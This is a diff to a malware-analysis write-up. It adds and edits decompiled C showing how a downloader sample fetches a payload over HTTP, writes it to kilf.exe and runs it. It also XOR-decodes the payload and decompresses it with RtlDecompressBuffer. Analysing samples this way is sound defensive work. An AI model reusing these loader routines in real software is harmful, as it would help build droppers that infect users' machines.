@@ -60,7 +60,7 @@ Next, when the binary is executing from %TEMP%, it will attempt to delete itself
 
 **Payload Downloading**
 
-Next up is a payload being downloaded over HTTP using Windows API calls (Dual Pauload)
+Next up is a payload being downloaded over HTTP using Windows API calls
 ```C
 v31 = InternetOpenW(L"Updates downloader", 0, 0, 0, 0); // InternetOpenW API with "Updates downloader" user-agent is held in variable v31
   if ( v31 ) // If this was successful, build an lpszAcceptTypes string of "text/application/*"
@@ -147,8 +147,6 @@ LABEL_14:
 
 **File Writing & Execution**
 
-if ( v15 - v14 == dwBytes )
-
 Once the payload is downloaded, the malware writes it to disk and attempts to execute it
 ```C
     hFile = CreateFileW(L"kilf.exe", 0x40000000u, 2u, 0, 2u, 0x80u, 0); // Creates a writable handle to kilf.exe in the current directory
@@ -162,6 +160,55 @@ Once the payload is downloaded, the malware writes it to disk and attempts to ex
       goto LABEL_8; // Terminate current process
 ```
 
-
+If any previous condition fails, the malware will instead decompress and decrypt the payload prior to execution:
+```C
+ nNumberOfBytesToRead = (DWORD)HeapAlloc(hHeap, 8u, 4 * dwBytes);
+    if ( nNumberOfBytesToRead )
+    {
+      v18 = dword_403010[(_DWORD)lpBuffer];
+      v19 = 4 * dwBytes;
+      v20 = 1;
+      v31 = 0;
+      if ( (dwBytes & 0xFFFFFFFC) > 4 )
+      {
+        do
+          *(_DWORD *)&v14[4 * v20++] ^= v18;
+        while ( v20 < dwBytes >> 2 );
+      }
+      LibraryW = LoadLibraryW(L"ntdll.dll");
+      hFile = LibraryW;
+      if ( LibraryW )
+      {
+        RtlDecompressBuffer = GetProcAddress(LibraryW, "RtlDecompressBuffer");
+        dword_403018 = (int)RtlDecompressBuffer;
+        if ( !RtlDecompressBuffer )
+        {
+          FreeLibrary((HMODULE)hFile);
+          return 1;
+        }
+        dwBytes -= 4;
+        v23 = v14 + 4;
+        v14 = (char *)nNumberOfBytesToRead;
+        ((void (__stdcall *)(int, DWORD, SIZE_T, _BYTE *, SIZE_T, LPCVOID *))RtlDecompressBuffer)(
+          258,
+          nNumberOfBytesToRead,
+          v19,
+          v23,
+          dwBytes,
+          &v31);
+        FreeLibrary((HMODULE)hFile);
+        dwBytes = v19;
+        goto LABEL_53;
+      }
+    }
+  }
+  return 1;
+}
+```
+.data:00403010 dword_403010    dd 12345678h            ; DATA XREF: start+395↑r
+.data:00403014                 db  78h ; x
+.data:00403015                 db  56h ; V
+.data:00403016                 db  34h ; 4
+.data:00403017                 db  12h
 
 ## First Payload 
